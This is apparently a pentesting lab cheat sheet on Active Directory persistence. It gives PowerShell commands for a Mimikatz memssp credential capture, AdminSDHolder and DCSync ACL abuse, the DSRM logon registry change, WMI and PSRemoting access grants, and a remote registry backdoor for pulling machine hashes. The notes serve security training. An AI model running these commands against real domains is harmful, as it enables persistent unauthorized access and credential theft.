# ACLs

### **Custom SSP**

With MimiKatz, or the use of mimilib.dll.

```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```

### **ACLs – AdminSDHolder**

#### Modify the ACLs to add Full Control permissions for a user to the AdminSDHolder using PowerView as a Domain Admin

{% code overflow="wrap" %}
```powershell
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 -Rights All -Verbose
```
{% endcode %}

#### _Using ActiveDirectory Module and Set-ADACL_

{% code overflow="wrap" %}
```powershell
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=<DOMAIN>,DC=<DOMAIN> C=<DOMAIN>' -Principal <Controlled User> -Verbose
```
{% endcode %}

#### _Use of_ [_race_ ](https://github.com/samratashok/RACE)_toolkit_

```AD_module
Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
```

### **ACLs – Right Abuse**

#### _Add FullControl rights_ using powershell

{% code overflow="wrap" %}
```powershell
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' - PrincipalSamAccountName <Controlled User> -Rights All -Verbose
```
{% endcode %}

#### Using ActiveDirectory Module and Set-ADACL

```AD_module
Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose
```

#### _Add rights for DCSync_ using powershell

{% code overflow="wrap" %}
```powershell
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' - PrincipalSamAccountName <Controlled User> -Rights DCSync -Verbose
```
{% endcode %}

#### Using ActiveDirectory Module and Set-ADACL

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal &#x3C;Controlled User> -GUIDRight DCSync -Verbose
</strong></code></pre>

### **DC persistence by abusing the DSRM service.**

The DSRM administrator is not allowed to logon to the DC from network. So we need to change the logon behavior for the account by modifying registry on the DC

{% code overflow="wrap" %}
```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Pasted image 20231025115059.png" alt=""><figcaption></figcaption></figure>

Now from the attack box we can simply [pass the hash](../active-directory/lateral-movement/pass-the/pass-the-hash.md) and use the dsrm administrator session

### **Grant remote access to a stupid user**

Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges. Open a session with invoke-mimi or rubeus and launch invishell. import the[ RACE.ps1 module](https://github.com/samratashok/RACE)

```powershell
. ./RACE.ps1
```

And modify the service

{% code overflow="wrap" %}
```powershell
Set-RemoteWMI -SamAccountName <Controlled User> -ComputerName <Machine> -namespace 'root\cimv2' -Verbose
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Pasted image 20231025144401.png" alt=""><figcaption></figcaption></figure>

Now we granted the acces to us

```powershell
gwmi -class win32_operatingsystem -ComputerName <MACHINE>
```

<figure><img src="../../.gitbook/assets/Pasted image 20231025144606.png" alt=""><figcaption></figcaption></figure>

***

We can do the same but with powershell. After opened the session and imported

```powershell
. C:\AD\Tools\RACE.ps1
```

{% code overflow="wrap" %}
```powershell
Set-RemotePSRemoting -SamAccountName <STUPID USER> -ComputerName <MACHINE> -Verbose
```
{% endcode %}

To check if the command worked

```powershell
Invoke-Command -ScriptBlock{whoami} -ComputerName <MACCHINA>
```

<figure><img src="../../.gitbook/assets/Pasted image 20231025145545.png" alt=""><figcaption></figcaption></figure>

### **Retrieve hash of Machine without admin access**

To retrieve access without Domain admin access we need to modify a permission on the dc. So open a session, import[ race.ps1](https://github.com/samratashok/RACE) and launche te command.

```powershell
. C:\AD\Tools\RACE.ps1
```

```powershell
Add-RemoteRegBackdoor -ComputerName <MACHINE> -Trustee <CONTROLLED USER> -Verbose
```

<figure><img src="../../.gitbook/assets/Pasted image 20231025150802.png" alt=""><figcaption></figcaption></figure>

and retrieve the hash

```powershell
. C:\AD\Tools\RACE.ps1
```

```powershell
Get-RemoteMachineAccountHash -ComputerName <MACHINE> -Verbose
```

<figure><img src="../../.gitbook/assets/Pasted image 20231025150902.png" alt=""><figcaption></figcaption></figure>

and with that we can [create a silver ticket](ticket-forging.md) for the services (in this case HOST)

##
